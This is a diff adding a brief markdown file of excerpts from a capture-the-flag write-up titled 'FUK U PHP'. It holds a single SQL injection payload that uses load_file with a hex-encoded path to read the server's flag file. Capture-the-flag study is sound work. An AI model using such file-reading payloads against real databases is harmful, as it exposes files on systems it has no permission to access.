@@ -1,0 +1,5 @@
+# FUK U PHP
+# Code and command excerpts from the UMCS UM 2026 write-up.
+
+## Build a five-character payload (sql)
+select load_file(0x2f666c6167)
